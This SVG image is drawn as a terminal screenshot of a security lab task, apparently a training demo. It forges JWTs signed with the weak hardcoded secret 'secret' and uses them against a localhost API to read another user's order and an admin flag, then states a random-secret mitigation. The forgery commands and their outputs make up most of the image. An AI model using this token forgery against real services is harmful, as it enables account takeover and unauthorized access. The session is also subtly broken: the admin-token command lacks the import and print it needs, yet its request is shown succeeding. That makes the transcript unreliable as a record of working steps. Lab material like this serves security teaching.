<svg xmlns="http://www.w3.org/2000/svg" width="880" height="370" font-family="'Menlo','Courier New',monospace" font-size="13">
  <rect width="880" height="370" rx="8" fill="#1e1e2e"/>
  <rect x="0" y="0" width="880" height="28" rx="8" fill="#313244"/>
  <circle cx="16" cy="14" r="5" fill="#f38ba8"/><circle cx="32" cy="14" r="5" fill="#a6e3a1"/><circle cx="48" cy="14" r="5" fill="#f9e2af"/>
  <text x="440" y="18" fill="#cdd6f4" text-anchor="middle" font-size="11">Task 3 — JWT Forgery via weak secret "secret" (CWE-321)</text>
  <text x="12" y="52" fill="#a6e3a1" font-size="12">$ printf '%s | %s | ' "$(whoami)" '6631503092'; date '+%F %T %Z'</text>
  <text x="12" y="70" fill="#cdd6f4" font-size="12">thomas | 6631503092 | 2026-09-13 16:51:15 +07</text>
  <text x="12" y="98" fill="#a6e3a1" font-size="12">$ FORGED2=$(python3 -c "import jwt; print(jwt.encode({'sub':'bob'}, 'secret', algorithm='HS256'))")</text>
  <text x="12" y="118" fill="#f9e2af" font-size="11">InsecureKeyLengthWarning: HMAC key is 6 bytes, below minimum 32 bytes for SHA256</text>
  <text x="12" y="138" fill="#cdd6f4" font-size="11">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJib2IifQ.-51G5JQmpJleARHp8rIljBczPFanWT93d_N_7LQGUXU</text>
  <text x="12" y="166" fill="#a6e3a1" font-size="12">$ curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"</text>
  <text x="12" y="186" fill="#f38ba8" font-size="12">{"item":"Phone","note":"FLAG{idor_demo}","owner":"bob","total":800}</text>
  <text x="12" y="206" fill="#f38ba8" font-size="12">  ↑ HS256 token signed with guessable secret "secret" — accepted as valid!</text>
  <text x="12" y="234" fill="#a6e3a1" font-size="12">$ FORGED2_ADMIN=$(python3 -c "jwt.encode({'sub':'admin'}, 'secret', algorithm='HS256')")</text>
  <text x="12" y="254" fill="#a6e3a1" font-size="12">$ curl -s http://localhost:8080/api/admin -H "Authorization: Bearer $FORGED2_ADMIN"</text>
  <text x="12" y="274" fill="#f38ba8" font-size="12">{"flag":"FLAG{jwt_demo}"}</text>
  <text x="12" y="294" fill="#f38ba8" font-size="12">  ↑ Admin flag extracted — 6-byte secret trivially guessable</text>
  <text x="12" y="322" fill="#585b70" font-size="11">Root cause: L9 SECRET="secret" — hardcoded, in every wordlist, crackable in seconds.</text>
  <rect x="12" y="338" width="856" height="22" rx="3" fill="#45475a"/>
  <text x="440" y="354" fill="#f9e2af" text-anchor="middle" font-size="11">Mitigation: solution_app.py L10 → os.urandom(32).hex() = 256-bit random secret</text>
</svg>
